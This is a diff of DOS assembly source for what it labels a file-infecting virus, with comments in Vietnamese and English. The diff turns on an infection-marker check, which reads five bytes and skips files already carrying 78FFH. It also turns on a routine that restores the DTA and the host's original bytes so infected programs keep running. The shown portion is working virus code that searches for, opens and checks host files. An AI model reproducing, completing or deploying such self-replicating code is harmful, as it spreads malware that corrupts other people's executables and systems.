@@ -4,7 +4,7 @@
     
 START:  
   jmp near ptr FIND_BEGIN     
-  ;db ''
+MARKER  db 78FFH
   
 VIRUS:       ;virus label   
 
@@ -29,11 +29,13 @@ FIND_LOOP:
     int 21H 
     mov bx,ax            ; put file handle vao bx    
     
-;CHECK_FILE:              ; check 5 byte cua virus (virus's marker)
-;    mov ah,3FH
-;    mov cx,3
-;    int 21h 
-;    jc  short CLOSE_FILE ; file da infected, move to next file.
+CHECK_FILE:              ; check 5 byte cua virus (virus's marker)
+    mov ah,3FH
+    mov cx,5
+    lea dx,[bp+TERMINATE]
+    int 21h 
+    cmp [word ptr bp+TERMINATE],78FFH
+    je  short CLOSE_FILE ; file da infected, move to next file.
     
     xor cx,cx
     xor dx,dx            ; cx:dx=0
@@ -82,15 +84,15 @@ CLOSE_FILE:
     jmp FIND_LOOP  
          
 DONE:
-;    mov ah,1AH                      ; restore DTA
-;    mov dx,80H
-;    int 21H
-;    mov si,offset START             ; restore 
-;    push si
-;    lea si,[bp+TERMINATE]
-;    movsw
-;    movsw
-;    movsb     
+    mov ah,1AH                      ; restore DTA
+    mov dx,80H
+    int 21H
+    mov si,offset START             ; restore 
+    push si
+    lea si,[bp+TERMINATE]
+    movsw
+    movsw
+    movsb     
     ret                             ; tra lai access cho host
         
     
